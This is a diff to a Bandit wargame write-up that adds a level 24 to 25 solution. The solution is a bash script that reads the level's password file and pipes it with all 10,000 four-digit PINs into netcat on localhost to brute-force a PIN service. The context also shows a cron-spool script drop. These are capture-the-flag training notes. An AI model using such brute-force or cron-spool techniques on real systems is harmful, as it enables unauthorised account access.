@@ -255,7 +255,7 @@ bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ```
 
-## level 23 -> 24
+## level 23 -> level 24
 
 ```shell
 bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 
@@ -305,3 +305,18 @@ bandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ cp script.sh /var/spool/bandit24/foo/
 ```
 
 After a minute or so, password will be written into `pass.txt`
+
+## level 24 -> level 25
+
+```shell
+#!/bin/bash
+set -e
+
+PASS=$(cat /etc/bandit_pass/bandit24)
+
+{
+    for PIN in $(seq -w 0000 9999); do
+        echo "$PASS $PIN"
+    done
+} | nc localhost 30002
+```
